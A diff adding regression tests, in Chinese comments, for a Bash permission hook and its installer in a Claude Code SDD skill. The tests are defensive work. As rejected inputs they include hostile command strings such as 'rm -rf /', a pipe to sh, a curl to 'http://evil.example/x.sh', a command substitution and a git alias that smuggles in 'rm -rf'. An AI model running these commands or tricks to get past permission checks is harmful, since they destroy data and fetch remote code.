@@ -12,9 +12,12 @@ SDD skill 回归测试 —— 校验 5 个脚本的行为。
   update_claude_md.py  幂等性、多 feature 共存、不破坏用户原有内容
   export_openspec.py   导出结构与 GIVEN/WHEN/THEN 拆分
   init_specs.py        骨架生成与不覆盖已有文件
+  sdd_bash_allow.py    PreToolUse hook 的放行判定(复合操作符、路径穿越、git 子命令)
+  install_hook.py      hook 安装、不破坏已有 settings.json、幂等
 """
 
 import io
+import json
 import os
 import re
 import shutil
@@ -1033,6 +1036,241 @@ def test_as_is_mode(tmp):
     check('性能 AC 未给量化阈值时报错', code != 0 and '量化' in out, out[-400:])
 
 
+def test_hook_and_installer(tmp):
+    """PreToolUse hook 的放行判定 + 安装器的幂等性。"""
+    print('\n=== sdd_bash_allow.py / install_hook.py ===')
+    sys.path.insert(0, os.path.join(SKILL, 'hooks'))
+    try:
+        import sdd_bash_allow as hook
+    except Exception as exc:  # pragma: no cover
+        check('hook 模块可导入', False, repr(exc))
+        return
+
+    def hit(cmd):
+        return hook.evaluate(cmd) is not None
+
+    # --- 放行 SDD 自己的脚本 ---
+    check('放行 skills/sdd/scripts 下的脚本',
+          hit('python "C:/Users/ghy/.claude/skills/sdd/scripts/validate_specs.py" --feature x'))
+    check('放行相对路径的 SDD 脚本',
+          hit('python skills/sdd/scripts/init_specs.py --help'))
+    check('放行项目内 .claude/sdd 下的脚本',
+          hit('python .claude/sdd/validate.py demo'))
+    check('放行带 -X 选项的 SDD 脚本',
+          hit('python -X utf8 skills/sdd/scripts/validate_specs.py --feature x'))
+
+    # --- 不放行任意 python ---
+    check('不放行 python -c 内联代码', not hit('python -c "print(1)"'))
+    check('不放行 python -m 任意模块', not hit('python -m evil_module'))
+    check('不放行 SDD 目录之外的 python 脚本',
+          not hit('python scripts/evil.py'))
+    check('不放行路径穿越到 SDD 目录之外',
+          not hit('python skills/sdd/scripts/../../evil.py'))
+
+    # --- 复合操作符一律不放行 ---
+    check('不放行 `python 脚本 && rm -rf`',
+          not hit('python skills/sdd/scripts/x.py && rm -rf /'))
+    check('不放行 `python 脚本; curl`',
+          not hit('python skills/sdd/scripts/x.py; curl http://evil'))
+    check('不放行 `python 脚本 | sh`',
+          not hit('python skills/sdd/scripts/x.py | sh'))
+    check('不放行命令替换',
+          not hit('python skills/sdd/scripts/x.py $(rm -rf /)'))
+
+    # --- 引号内的元字符不算复合操作 ---
+    check('放行 commit message 里带 > 的 git 命令',
+          hit('git commit -m "fix -> bug"'))
+    check('放行前导 cd 的形式',
+          hit('cd "D:/prep for work/Projects/X" && python skills/sdd/scripts/x.py'))
+
+    # --- git ---
+    check('放行 git status', hit('git status'))
+    check('放行 git -C <路径> status', hit('git -C "D:/x" status'))
+    check('放行 git commit', hit('git commit -m "msg"'))
+    check('不放行 git push', not hit('git push origin main'))
+    check('不放行 git reset --hard', not hit('git reset --hard'))
+    check('不放行 git clean', not hit('git clean -fd'))
+    # git 的前置选项能改行为,一律不放行:
+    # -c 能定义 alias 把"安全子命令"换成任意 shell;--exec-path 能换掉子命令查找路径
+    check('不放行 git -c alias 绕过',
+          not hit('git -c "alias.status=!rm -rf /" status'))
+    check('不放行 git --exec-path 换子命令查找路径',
+          not hit('git --exec-path=/evil status'))
+    check('不放行 git --git-dir 指向别的仓库',
+          not hit('git --git-dir=/other/repo status'))
+
+    # --- 危险可执行文件:即使用户写进白名单也不放行 ---
+    check('白名单里有 rm 也不放行 rm',
+          hook.evaluate('rm -rf /', extra=['rm -rf /']) is None)
+    check('白名单里有 curl 也不放行 curl',
+          hook.evaluate('curl http://evil.example/x.sh', extra=['curl']) is None)
+    check('白名单里有 rm 也不放行 rm -rf /data',
+          hook.evaluate('rm -rf /data', extra=['rm -rf /']) is None)
+
+    # --- 太松的白名单模式等于开后门 ---
+    check('松散模式 python 放不了 python -c',
+          hook.match_extra('python -c "x"', ['python', '-c', 'x'], ['python']) is None)
+    check('松散模式 python -m 放不了任意模块',
+          hook.match_extra('python -m evil', ['python', '-m', 'evil'],
+                           ['python -m']) is None)
+    check('钉死模块的 python -m pytest 照常放行',
+          hook.match_extra('python -m pytest', ['python', '-m', 'pytest'],
+                           ['python -m pytest']) is not None)
+
+    # --- 默认额外白名单 ---
+    check('放行 pytest', hit('pytest tests/test_x.py'))
+    check('放行 npm test', hit('npm test'))
+    check('放行 python -m pytest(内置测试命令)', hit('python -m pytest'))
+    check('不放行名字相近的其他命令', not hit('pytestx tests/test_x.py'))
+
+    # 直接盯住 load_allowlist 的两个返回值 —— 内置默认项曾经因为元组解包写反
+    # (extra, tools = [], list(DEFAULT_EXTRA))被塞进 tools,导致内置白名单全部失效
+    loaded_extra, loaded_tools = hook.load_allowlist()
+    check('内置默认白名单在 extra 里', 'pytest' in loaded_extra, repr(loaded_extra[:5]))
+    check('内置默认白名单没混进 tools', 'pytest' not in loaded_tools, repr(loaded_tools[:5]))
+    check('文件白名单与内置默认项合并', len(loaded_extra) >= len(hook.DEFAULT_EXTRA),
+          '%d < %d' % (len(loaded_extra), len(hook.DEFAULT_EXTRA)))
+
+    # --- 空输入不炸 ---
+    check('空命令不放行', not hit(''))
+    check('None 不炸', hook.evaluate(None) is None)
+
+    # --- 安装器 ---
+    base = os.path.join(tmp, 'hook-install')
+    os.makedirs(os.path.join(base, 'specs', 'demo'), exist_ok=True)
+    with io.open(os.path.join(base, 'specs', 'demo', 'tasks.md'), 'w',
+                 encoding='utf-8', newline='\n') as fh:
+        fh.write('# 任务\n\n### TASK-001: 实现登录\n\n'
+                 '- **验证命令**: `pytest tests/test_login.py`\n')
+    # 已有的 settings.json 不能被破坏
+    settings_path = os.path.join(base, '.claude', 'settings.json')
+    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
+    with io.open(settings_path, 'w', encoding='utf-8', newline='\n') as fh:
+        fh.write('{"permissions": {"allow": ["Bash(git:*)"]}, "model": "opus"}\n')
+
+    code, out = run('install_hook.py', '--root', base, '--feature', 'demo')
+    check('安装器执行成功', code == 0, out[-400:])
+    check('装出了 hook 文件',
+          os.path.isfile(os.path.join(base, '.claude', 'hooks', 'sdd_bash_allow.py')))
+    check('装出了白名单文件',
+          os.path.isfile(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json')))
+
+    with io.open(settings_path, encoding='utf-8') as fh:
+        settings = json.load(fh)
+    check('settings.json 保留了原有 permissions',
+          settings.get('permissions', {}).get('allow') == ['Bash(git:*)'])
+    check('settings.json 保留了其他键', settings.get('model') == 'opus')
+    pre = settings.get('hooks', {}).get('PreToolUse', [])
+    check('注册了 PreToolUse 条目',
+          any('sdd_bash_allow.py' in str(h.get('command', ''))
+              for e in pre for h in (e.get('hooks') or [])), json.dumps(pre)[:300])
+
+    with io.open(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json'),
+                 encoding='utf-8') as fh:
+        allowlist = json.load(fh)
+    check('验证命令被写进白名单',
+          'pytest tests/test_login.py' in allowlist.get('extra', []),
+          json.dumps(allowlist, ensure_ascii=False)[:300])
+
+    # 幂等:再跑一次不应产生重复条目
+    code, out = run('install_hook.py', '--root', base, '--feature', 'demo')
+    with io.open(settings_path, encoding='utf-8') as fh:
+        settings2 = json.load(fh)
+    pre2 = settings2.get('hooks', {}).get('PreToolUse', [])
+    ours = [e for e in pre2
+            if any('sdd_bash_allow.py' in str(h.get('command', ''))
+                   for h in (e.get('hooks') or []))]
+    check('重复安装不产生重复条目', len(ours) == 1, json.dumps(pre2)[:300])
+    with io.open(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json'),
+                 encoding='utf-8') as fh:
+        allowlist2 = json.load(fh)
+    check('重复安装白名单不重复累加',
+          allowlist2.get('extra', []).count('pytest tests/test_login.py') == 1,
+          json.dumps(allowlist2, ensure_ascii=False)[:300])
+
+    # dry-run 不落盘
+    base2 = os.path.join(tmp, 'hook-dry')
+    os.makedirs(base2, exist_ok=True)
+    code, out = run('install_hook.py', '--root', base2, '--dry-run')
+    check('dry-run 成功', code == 0, out[-300:])
+    check('dry-run 不写文件',
+          not os.path.exists(os.path.join(base2, '.claude', 'hooks',
+                                          'sdd_bash_allow.py')))
+
+    # ---- 安装器的安全性(来自对抗式审查的发现)----
+    # ① 同组里用户自己注册的 hook 不能被一起删掉
+    base3 = os.path.join(tmp, 'hook-safety')
+    os.makedirs(os.path.join(base3, '.claude'), exist_ok=True)
+    settings3 = os.path.join(base3, '.claude', 'settings.json')
+    with io.open(settings3, 'w', encoding='utf-8', newline='\n') as fh:
+        fh.write(json.dumps({'hooks': {'PreToolUse': [
+            {'matcher': 'Bash', 'hooks': [
+                {'type': 'command', 'command': 'python ".claude/hooks/sdd_bash_allow.py"'},
+                {'type': 'command', 'command': 'my-own-hook.sh'}]},
+            {'matcher': 'Edit', 'hooks': [
+                {'type': 'command', 'command': 'other.sh'}]}]}}, ensure_ascii=False))
+    code, out = run('install_hook.py', '--root', base3)
+    with io.open(settings3, encoding='utf-8') as fh:
+        s3 = json.load(fh)
+    cmds3 = [h.get('command', '')
+             for e in s3['hooks']['PreToolUse']
+             for h in (e.get('hooks') or [])]
+    check('同组里用户自己的 hook 没被删', 'my-own-hook.sh' in cmds3, json.dumps(cmds3))
+    check('别的 matcher 组没被动', 'other.sh' in cmds3, json.dumps(cmds3))
+    check('我们的 hook 只注册了一条',
+          sum(1 for c in cmds3 if 'sdd_bash_allow.py' in c) == 1, json.dumps(cmds3))
+
+    # ② 结构不对就拒绝覆盖,别把用户的东西抹掉
+    base4 = os.path.join(tmp, 'hook-badshape')
+    os.makedirs(os.path.join(base4, '.claude'), exist_ok=True)
+    bad = os.path.join(base4, '.claude', 'settings.json')
+    with io.open(bad, 'w', encoding='utf-8', newline='\n') as fh:
+        fh.write('{"hooks": "not-an-object"}')
+    code, out = run('install_hook.py', '--root', base4)
+    check('settings.json 结构不对时拒绝执行', code != 0 and 'hooks' in out, out[-300:])
+    with io.open(bad, encoding='utf-8') as fh:
+        check('结构不对时文件没被改写', fh.read() == '{"hooks": "not-an-object"}')
+
+    # ③ 验证命令的提取:无反引号也能提;含复合操作符的不提
+    base5 = os.path.join(tmp, 'hook-extract')
+    os.makedirs(os.path.join(base5, 'specs', 'demo'), exist_ok=True)
+    with io.open(os.path.join(base5, 'specs', 'demo', 'tasks.md'), 'w',
+                 encoding='utf-8', newline='\n') as fh:
+        fh.write('# 任务\n\n### TASK-001: 实现登录\n\n'
+                 '- **验证命令**: pytest tests/test_login.py\n'
+                 '- **验证命令**: `pytest tests/test_x.py`\n'
+                 '- **验证命令**: `pytest a.py && rm -rf /`\n')
+    code, out = run('install_hook.py', '--root', base5, '--feature', 'demo')
+    with io.open(os.path.join(base5, '.claude', 'hooks', 'sdd-hook-allow.json'),
+                 encoding='utf-8') as fh:
+        al5 = json.load(fh)
+    check('无反引号的验证命令也能提取',
+          'pytest tests/test_login.py' in al5.get('extra', []),
+          json.dumps(al5, ensure_ascii=False))
+    check('带反引号的验证命令也能提取',
+          'pytest tests/test_x.py' in al5.get('extra', []),
+          json.dumps(al5, ensure_ascii=False))
+    check('含复合操作符的验证命令不放行',
+          not any('rm -rf' in c for c in al5.get('extra', [])),
+          json.dumps(al5, ensure_ascii=False))
+
+    # ④ --root 指向不存在的目录要友好报错,而不是把整条目录树建出来
+    code, out = run('install_hook.py', '--root', os.path.join(tmp, 'no-such-dir-xyz'))
+    check('--root 指向不存在的目录时报错', code != 0 and '目录' in out, out[-200:])
+    check('--root 报错时没有把目录建出来',
+          not os.path.exists(os.path.join(tmp, 'no-such-dir-xyz')))
+
+    # ⑤ hook 命令:默认绝对路径;解释器路径要加引号
+    sys.path.insert(0, SCRIPTS)
+    import install_hook as installer
+    entry = installer.hook_entry('C:/Program Files/Python313/python.exe',
+                                  os.path.join(tmp, 'x'))
+    cmd = entry['hooks'][0]['command']
+    check('解释器路径带空格时加了引号', cmd.startswith('"C:/Program Files/'), cmd)
+    check('默认用绝对路径而不是 ${CLAUDE_PROJECT_DIR}',
+          '${CLAUDE_PROJECT_DIR}' not in cmd, cmd)
+
+
 def main():
     tmp = tempfile.mkdtemp(prefix='sdd-tests-')
     print('临时目录: %s' % tmp)
@@ -1046,6 +1284,7 @@ def main():
         test_meta_section(tmp)
         test_assumption_vs_open_question(tmp)
         test_as_is_mode(tmp)
+        test_hook_and_installer(tmp)
     finally:
         shutil.rmtree(tmp, ignore_errors=True)
     print('\n' + '=' * 52)
